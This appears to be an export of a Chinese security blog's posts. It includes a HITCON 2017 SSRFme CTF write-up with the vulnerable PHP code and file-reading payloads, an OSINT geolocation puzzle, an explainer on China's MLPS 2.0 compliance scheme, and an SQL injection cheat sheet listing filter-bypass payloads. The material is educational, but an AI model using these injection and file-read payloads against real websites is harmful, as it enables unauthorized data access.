src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20134222.png"></p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-18%20134331.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hitcon_2017_ssrfme</title>
      <link href="/2021/10/06/hitcon-2017-ssrfme/"/>
      <url>/2021/10/06/hitcon-2017-ssrfme/</url>
      
        <content type="html"><![CDATA[<h1 id="hitcon-2017-ssrfme"><a href="#hitcon-2017-ssrfme" class="headerlink" title="hitcon_2017_ssrfme"></a>hitcon_2017_ssrfme</h1><pre><code class="php"> &lt;?php     $sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);     @mkdir($sandbox);     @chdir($sandbox);     $data = shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     $info = pathinfo($_GET[&quot;filename&quot;]);     $dir  = str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));     @mkdir($dir);     @chdir($dir);     @file_put_contents(basename($info[&quot;basename&quot;]), $data);     highlight_file(__FILE__); </code></pre><p>这个代码的意思大概是通过GET方法请求到的数据保存在我们自定义的文件名当中。</p><p>给url参数传递&#x2F;可以查看根目录下的内容</p><pre><code>$sandbox = &quot;sandbox/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);</code></pre><p>访问sandbox&#x2F;+md5(orange+出口Ip)    注意:加密后用小写的</p><p>如果出现下图，说明路径是对的</p><p><img src="https://img-blog.csdnimg.cn/20210502212135484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxNjUyODY0,size_16,color_FFFFFF,t_70"></p><p>然后构造payload1:</p><pre><code>?url=/&amp;fliename=aaa</code></pre><p>这个aaa可以随便写，能用就行</p><p>然后访问:</p><pre><code>/sandbox/md5加密后的内容/aaa</code></pre><p>出现以下目录</p><p><img src="https://i.loli.net/2021/10/07/9A3qsJf8m6QoLlp.png">)</p><p>可以看到flag</p><p>然后改一下payload继续以上操作</p><pre><code>?url=/flag&amp;fliename=aaa</code></pre><pre><code>/sandbox/md5加密后的内容/aaa</code></pre><p>发现文件没法显示</p><p><img src="https://i.loli.net/2021/10/07/1d7aiGARerbP4OX.png"></p><p>继续改payload</p><pre><code>?url=/flag&amp;fliename=aaa.txt</code></pre><pre><code>/sandbox/md5加密后的内容/aaa.txt</code></pre><p>flag就出来了</p><p><img src="https://i.loli.net/2021/10/07/7CsKIJzpm6XnLSx.png"></p><h2 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h2><p>“REMOTE_ADDR” ：正在浏览当前页面用户的 IP 地址</p><p>escapeshellarg （）：— 把字符串转码为可以在 shell 命令里使用的参数</p><p>pathinfo()： 函数以数组的形式返回关于文件路径的信息</p><p>basename() 函数返回路径中的文件名部分</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络迷踪</title>
      <link href="/2021/10/04/%E7%BD%91%E7%BB%9C%E8%BF%B7%E8%B8%AA/"/>
      <url>/2021/10/04/%E7%BD%91%E7%BB%9C%E8%BF%B7%E8%B8%AA/</url>
      
        <content type="html"><![CDATA[<h1 id="网络迷踪"><a href="#网络迷踪" class="headerlink" title="网络迷踪"></a>网络迷踪</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>从图中信息找到该麦当劳门店所在位置：</p><p><img src="https://i.loli.net/2021/10/05/YqzwIRnhU9isgZL.jpg"></p><h2 id="图中获取到的信息"><a href="#图中获取到的信息" class="headerlink" title="图中获取到的信息"></a>图中获取到的信息</h2><ol><li><p>这是小票上的信息erbang alaf restaurants，Tesco pe…，jalan SS21&#x2F;39</p><p><img src="https://i.loli.net/2021/10/05/6AaUnSLgKIdc9GW.jpg"></p></li><li><p>麦当劳  McDonald’s</p></li></ol><h2 id="搜索引擎搜索"><a href="#搜索引擎搜索" class="headerlink" title="搜索引擎搜索"></a>搜索引擎搜索</h2><ol><li><p>erbang alaf restaurants</p><p><img src="https://i.loli.net/2021/10/05/8Jhn6EjDePNizAc.png"></p><p>2.搜索gerbang alaf restaurants address ，发现是一家名为Gerbang Alaf Restaurant Sdn Bhd的店，地点锁定在马来西亚</p><p><img src="https://i.loli.net/2021/10/05/XYnLf7pCRBWZhSw.png"></p><p>翻译一下: <strong>Level 6, Bangunan TH, Damansara Uptown 3. No 3, Jalan SS21&#x2F;39, 47400 Petaling Jaya</strong>.得到其详细地址</p><p><img src="https://i.loli.net/2021/10/11/3mceCOgvxU4QXZq.png"></p><p>然后用谷歌地图定位应该就可以了</p></li></ol><p><a href="https://www.icode9.com/content-4-1165067.html">这是网上找到的答案</a></p><p>​</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>等保2.0</title>
      <link href="/2021/10/04/%E7%AD%89%E4%BF%9D2-0/"/>
      <url>/2021/10/04/%E7%AD%89%E4%BF%9D2-0/</url>
      
        <content type="html"><![CDATA[<h1 id="等保2-0"><a href="#等保2-0" class="headerlink" title="等保2.0"></a>等保2.0</h1><h2 id="等保1-0回顾"><a href="#等保1-0回顾" class="headerlink" title="等保1.0回顾"></a>等保1.0回顾</h2><p>在开始讲等保2.0之前，让我们先回顾一下等保1.0。等保1.0发布距今已经有10多年的时间，在这些日子里，网络安全也越来越被人们所重视。</p><p>在1.0的初期，企业只要有安全意识，能开始做等保，开始测评就已经很不错了；到了中期，整体防护，渗透测试，合规开始等于安全。行业等级保护全面开展，等保开始逐渐的深入人心；再到1.0的后期，无论是企业层面还是国家层面，都更注重实质性的安全。主动防御、态势感知、攻防对抗等安全手段开始流行，云安、大数据、工控安全和移动安全开始占领主要趋势。</p><p>等保1.0普及了等保概念，强化了安全意识，从单个系统到部门、到行业，再到上升到国家层面从合规到攻防对抗，整体提升了网络安全保障能力技术并且不断进行人才的积累，这些都对等保2.0提供了有力的支撑。</p><h2 id="等保2-0是什么？"><a href="#等保2-0是什么？" class="headerlink" title="等保2.0是什么？"></a>等保2.0是什么？</h2><p>等保2.0全称网络安全等级保护2.0制度，是我国网络安全领域的基本国策、基本制度。等级保护标准在1.0时代标准的基础上，注重主动防御，从被动防御到事前、事中、事后全流程的安全可信、动态感知和全面审计，实现了对传统信息系统、基础信息网络、云计算、大数据、物联网、移动互联网和工业控制信息系统等级保护对象的全覆盖。</p><h2 id="等保2-0有哪些不变？"><a href="#等保2-0有哪些不变？" class="headerlink" title="等保2.0有哪些不变？"></a>等保2.0有哪些不变？</h2><p>1.五个级别不变</p><p>从第一级到第五级依次是：用户自主保护级、系统审计保护级、安全标记保护级、结构化保护级、访问验证保护级。</p><p><img src="https://img-blog.csdnimg.cn/20200818171120422.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDQ1MjQx,size_16,color_FFFFFF,t_70"></p><p>等级保护五个级别</p><p>2.规定动作不变</p><p>规定动作分别为：定级、备案、建设整改、等级测评、监督检查。</p><p>等级保护规定动作</p><p>3.主体职责不变</p><p>等级保护的主体职责为：网安对定级对象的备案受理及监督检查职责、第三方测评机构对定级对象的安全评估职责、上级主管单位对所属单位的安全管理职责、运营使用单位对定级对象的等级保护职责。</p><h2 id="等保2-0有哪些变化？"><a href="#等保2-0有哪些变化？" class="headerlink" title="等保2.0有哪些变化？"></a>等保2.0有哪些变化？</h2><p>近年来，随着信息技术的发展和网络安全形势的变化，等保1.0要求已无法有效应对新的安全风险和新技术应用所带来的新威胁，等保1.0被动防御为主的防御无法满足当前发展要求，因此急需建立一套主动防御体系。等保2.0适时而出，从法律法规、标准要求、安全体系、实施环节等方面都有了变化。</p><p>1.标准依据的变化</p><p>从条例法规提升到法律层面。等保1.0的最高国家政策是国务院147号令，而等保2.0标准的最高国家政策是网络安全法，其中《中华人民共和国网络安全法》第二十一条要求，国家实施网络安全等级保护制度；第二十五条要求，网络运营者应当制定网络安全事件应急预案；第三十一条则要求，关键基础设施，在网络安全等级保护制度的基础上，实行重点保护；第五十九条规定的网络安全保护义务的，由有关主管部门给予处罚。因此不开展等级保护等于违法。</p><p>2.标准要求变化</p><p>等级2.0在1.0基本上进行了优化，同时对云计算、物联网、移动互联网、工业控制、大数据新技术提出了新的安全扩展要求。在使用新技术的信息系统需要同时满足“通用要求+扩展要求”。且针对新的安全形势提出了新的安全要求，标准覆盖度更加全面，安全防护能力有很大提升。</p><p>通用要求方面，等保2.0标准的核心是优化。删除了过时的测评项，对测评项进行合理改写，新增对新型网络攻击行为防护和个人信息保护等新要求，调整了标准结构、将安全管理中心从管理层面提升至技术层面。</p><p>扩展要求扩展了云计算、物联网、移动互联网、工业控制、大数据。</p><p>3.安全体系变化</p><p>等保2.0相关标准依然采用“一个中心、三重防护”的理念，从等保1.0被动防御的安全体系向事前防御、事中相应、事后审计的动态保障体系转变。建立安全技术体系和安全管理体系，构建具备相应等级安全保护能力的网络安全综合防御体系，开展组织管理、机制建设、安全规划、通报预警、应急处置、态势感知、能力建设、监督检查、技术检测、队伍建设、教育培训和经费保障等工作。</p><p>4.等级规定动作</p><p>保护定级、备案、建设整改、等级测评、监督检查的实施过程中，等保2.0进行了优化和调整。</p><p>（1）定级对象的变化。</p><p>等保1.0定级的对象是信息系统，等保2.0的定级对象扩展至基础信息网络、工业控制系统、云计算平台、物联网、使用移动互联技术的网络、其他网络以及大数据等多个系统平台，覆盖面更广。</p><p>（2）定级级别的变化。</p><p>公民、法人和其他组织的合法权益产生特别严重损害时，相应系统的等级保护级别从1.0的第二级调整到了第三级（根据GA&#x2F;T1389）。</p><p>（3）定级流程的变化。</p><p>等保2.0标准不再自主定级，二级及以上系统定级必须经过专家评审和主管部门审核，才能到公安机关备案，整体定级更加严格。</p><p>（4）测评合格要求提高</p><p>相较于等保1.0，等保2.0测评的标准发生了变化，2.0中测评结论分为：优（90分及以上）、良（80分及以上）、中（70分及以上）、差（低于70分），70分以上才算基本符合要求，基本分调高了，测评要求更加严格。</p><p><img src="https://img-blog.csdnimg.cn/20200818171120511.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDQ1MjQx,size_16,color_FFFFFF,t_70"></p><p>网络安全战略规划目标<br>等保2.0的实施对企业有什么影响？</p><p>根据谁主管谁负责、谁运营谁负责、谁使用谁负责的原则，网络运营者成为等级保护的责任主体，如何快速高效地通过等级保护测评成为企业开展业务前必须思考的问题。</p><p>等保2.0有5个运行步骤：定级、备案、建设和整改、等级测评、检查。同时，也分5个等级，即信息系统按重要程度由低到高分为5个等级，并分别实施不同的保护策略。</p><p><img src="https://img-blog.csdnimg.cn/20200818171120425.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMDQ1MjQx,size_16,color_FFFFFF,t_70"></p><p>相关处罚措施有:</p><p>《网络安全法》第五十九条规定：</p><p>网络运营者不履行义务的：由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>关键信息基础设施的运营者不履行义务的 ：由有关主管部门责令改正，给予警告； 拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p>划重点：用户单位不做等级保护测评，用户单位需要被罚款1万-100万；主管人员需要被罚款5000-100000。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>s q l注入小结</title>
      <link href="/2021/05/26/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"/>
      <url>/2021/05/26/sql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="s-q-l-注入的小总结"><a href="#s-q-l-注入的小总结" class="headerlink" title="s q l 注入的小总结"></a>s q l 注入的小总结</h1><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>​就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><h2 id="s-q-l注入攻击一般流程："><a href="#s-q-l注入攻击一般流程：" class="headerlink" title="s q l注入攻击一般流程："></a>s q l注入攻击一般流程：</h2><h2 id="1-判断注入点："><a href="#1-判断注入点：" class="headerlink" title="1.判断注入点："></a>1.判断注入点：</h2><p>​判断一个链接是否存在注入漏洞，可以通过对其传入的参数（但不仅仅只限于参数，还有cookie注入，HTTP头注入等） 进行构造，然后对服务器返回的内容进行判断来查看是否存在注入点。</p><h2 id="2-判断注入点类型"><a href="#2-判断注入点类型" class="headerlink" title="2.判断注入点类型"></a>2.判断注入点类型</h2><ul><li><p>按照参数类型分类：</p><p>​    (1)数字型注入： 如id&#x3D;1 ，传入的参数是数字，注入时该参数不需要用单或双引号构造闭合。        </p><p>​(2)字符型注入：如username&#x3D;admin  ,传入的参数是字符或字符串，注入时要注意去构造闭合。</p></li><li><p>按照数据请求方式分类:</p><p>​(1)GET注入</p><p>​(2)POST注入</p><p>​(3)HTTP请求头注入</p></li><li><p>按照语句执行效果分类：</p><p>​(1)union联合查询注入</p><p>​(2)报错注入</p><p>​(3)堆叠注入</p><p>​(4)宽字节注入</p><p>​(5)基于布尔的盲注</p><p>​(6)基于时间的盲注</p><p>​(7)二次注入</p><p>​(8)cookie注入 - http请求头参数注入</p><p>​(9)base64注入攻击</p></li></ul><h3 id="3-判断数据库类型"><a href="#3-判断数据库类型" class="headerlink" title="3.判断数据库类型"></a>3.判断数据库类型</h3><ul><li>常见网页类型对应的数据库：</li></ul><table><thead><tr><th>网页类型</th><th>数据库</th></tr></thead><tbody><tr><td>PHP</td><td>MySQL</td></tr><tr><td>asp</td><td>Access&#x2F;SQL server</td></tr><tr><td>.net</td><td>SQL server</td></tr><tr><td>java</td><td>oracle&#x2F;MySQL</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><ul><li>可以通过数据库报错信息来判断数据库类型，例如输入单双引号；</li><li>可用特殊字符或注释判断：<br>1,“null”和“%00”是Access支持的注释。<br>2，“#”是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和&#x2F;* <em>&#x2F;注释（注意mysql使用– 时需要后面添加空格）<br>3，“–”和&#x2F;</em> *&#x2F;是Oracle，SQL server和MSSQL支持的注释符，如果正常，说明可能就是这仨了。<br>4，“;”是子句查询标识符，在Oracle中不支持多行查询，返回错误，很可能是Oracle数据库。<br>这样一串下来，基本就知道了数据库类型了</li></ul><h3 id="4-获取数据提权"><a href="#4-获取数据提权" class="headerlink" title="4.获取数据提权"></a>4.获取数据提权</h3><p>这方面鄙人不熟，各位大佬轻喷….</p><h3 id="5-过滤绕过："><a href="#5-过滤绕过：" class="headerlink" title="5.过滤绕过："></a>5.过滤绕过：</h3><p>在实战或ctf中，网站前后端会将用户输入的字符进行过滤，这时就要通过特殊手段绕过过滤。以下是网上文章整合内容</p><h4 id="1-进行fuzz模糊测试："><a href="#1-进行fuzz模糊测试：" class="headerlink" title="(1)进行fuzz模糊测试："></a>(1)进行fuzz模糊测试：</h4><p>输入一些特殊字符或关键字进行测试，这个主要是为了知道数据 库对那些字符或关键字进行了过滤 ，然后对症下药。可以用burpsuite 结合字典来测试。字典部分截图如下，</p><p>​ <img src="/img/sql%E6%B3%A8%E5%85%A5%E5%AD%97%E5%85%B8.png" alt="截图 2020-05-28 172126"></p><h4 id="2-空格被过滤："><a href="#2-空格被过滤：" class="headerlink" title="(2)空格被过滤："></a>(2)空格被过滤：</h4><blockquote><p>1.使用注释符&#x2F; * * &#x2F;，内联注释：&#x2F; * !不带小数点的版本号+关键字*&#x2F;<br>（实战和CTF简单题有些用）<br>2.利用apache的CVE（并且是mysql 5.0版本以上）：<br>%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、<br>%0b TAB键（垂直）、%a0 ，%20空格(这两个有点拉胯)<br>上述的几个字符对付不严格的正则匹配比较有用<br>举例：id&#x3D;-1 union %0A select 1,2,3 from xxx</p><p>用联合查询时（union）用“（）”来代替空格</p><p>如 select(username)from(users)where(id&#x3D;1)</p></blockquote><h4 id="3-引号被过滤："><a href="#3-引号被过滤：" class="headerlink" title="(3)引号被过滤："></a>(3)引号被过滤：</h4><blockquote><p>1.用16进制：0x加上16进制转换后的字符串</p><p>2.未使用addslashes,且注释和反斜杠没有被过滤的情况下：使用单引号转义，构造playload使其拼接成如下语句：</p><pre><code class="sql">select * from user where username=&#39;admin\&#39; and passwd=&#39;123456&#39;;#后面剩下的语句;</code></pre></blockquote><blockquote><ol start="3"><li>在GBK编码条件下使用宽字节注入。</li></ol></blockquote><h4 id="4-等价替换："><a href="#4-等价替换：" class="headerlink" title="(4)等价替换："></a>(4)等价替换：</h4><blockquote><p>and&#x3D;&amp;&amp;&#x3D;%26%26<br>or&#x3D;||&#x3D;%7c%7c<br>xor&#x3D;^</p><p>select在堆叠开启的时候可以用handler代替</p><p>等价函数：<br>ascii()&#x3D;ord()，也可以把这个换成hex,bin,to_base64等等<br>char()&#x3D;chr()<br>mid(xxx,a,b)&#x3D;substring(xxx,a,b)&#x3D;substr(xxx,a,b)<br>还有一个来自我的突发奇想，但是有个缺点就是读到最后会重复返回最后一个字符<br>mid(xxx,a,b)&#x3D;right(left(xxx,a+b),b)<br>strcmp(left(xxx,a),b)，功能类似于like</p><p>where被过滤：<br>from table where id&#x3D;1 等价于<br>from table  a join table b on a(或者b).id&#x3D;1 </p><p>时间盲注中相关函数被过滤可以使用笛卡尔积<br>information_schema.collations,information_schema.collations,information_schema.collations<br>三个collations表做笛卡尔积时间大约为6秒，这个表在一般情况下都是固定的数量，所以对于不同地方的数据库，时间大致都相同。<br>但是注意要在mysql 5以上才可以（只有mysql5以上才有元数据的这个表）<br>这个方法可以直接拿来替换sqlmap掉payloadxml中的sleep(5)，因为sqlmap对time-sec参数的优化是用一种数学方法，所以sleep(5)<br>只是个形式。</p></blockquote><h4 id="5-逗号被过滤："><a href="#5-逗号被过滤：" class="headerlink" title="(5)逗号被过滤："></a>(5)逗号被过滤：</h4><blockquote><p>对于列名</p><pre><code>select 1,2 from xxx = select * from (select 1)a join (select 2)b</code></pre></blockquote><blockquote><p>对于mid(),substr(),substring()这样的三参数字符串截取函数可以使用</p><pre><code>mid(database() from 2 for 1) = mid(database(),2,1)</code></pre></blockquote><blockquote><p>还有一种很常用的使用like或者regexp</p><p>like ‘a%’<br>regexp ‘^a’</p><p>然后逐次增加后面的字母</p></blockquote><blockquote><p>limit的第二个参数用offset绕过</p><pre><code>limit 0,1 = llimit 0 offset 1</code></pre></blockquote><h4 id="6-特殊操作："><a href="#6-特殊操作：" class="headerlink" title="(6)特殊操作："></a>(6)特殊操作：</h4><p>对付正则用双写绕过，如selselectect.</p><p>大小写绕过</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
